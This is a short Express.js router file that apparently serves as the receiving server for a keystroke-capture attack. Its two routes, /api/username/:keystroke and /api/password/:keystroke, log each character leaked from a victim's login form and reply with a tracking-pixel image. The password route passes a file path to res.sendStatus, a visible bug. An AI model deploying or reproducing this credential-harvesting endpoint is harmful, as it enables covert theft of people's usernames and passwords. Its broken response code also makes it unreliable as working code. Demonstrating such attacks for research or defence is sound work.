const express = require('express');
const path = require('path');

const router = express.Router();

const trackingPixelPath = path.join(
  __dirname,
  '..',
  'public',
  'images',
  'track.png'
);

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Express' });
});

router.get('/api/username/:keystroke', function(req, res, next) {
  console.log('username:', req.params.keystroke);
  res.sendFile(trackingPixelPath);
});

router.get('/api/password/:keystroke', function(req, res, next) {
  console.log('password:', req.params.keystroke);
  res.sendStatus(trackingPixelPath);
});

module.exports = router;
